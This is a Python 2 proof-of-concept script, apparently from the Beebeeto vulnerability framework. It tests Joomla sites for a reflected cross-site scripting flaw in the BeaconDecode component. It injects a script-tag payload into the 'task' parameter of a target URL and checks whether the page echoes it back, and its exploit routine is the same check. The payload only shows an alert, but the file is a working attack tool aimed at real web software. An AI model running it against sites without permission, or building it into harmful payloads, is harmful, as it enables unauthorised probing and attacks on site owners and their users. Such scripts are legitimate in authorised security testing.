#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0126',
            'name': 'Joomla BeaconDecode 跨站脚本漏洞 POC',
            'author': 'tmp',
            'create_date': '2014-10-29',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Joomla',
            'vul_version': ['*'],
            'type': 'Cross Site Scripting',
            'tag': ['Joomla漏洞', 'XSS漏洞', 'BeaconDecode', 'php'],
            'desc': 'Vulnerable File: index.php?option=com_beacondecode&task=',
            'references': ['https://www.yascanner.com/#!/x/19498',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/index.php?option=com_beacondecode&task="/><script>alert(233)</script>'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '"/><script>alert(233)</script>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())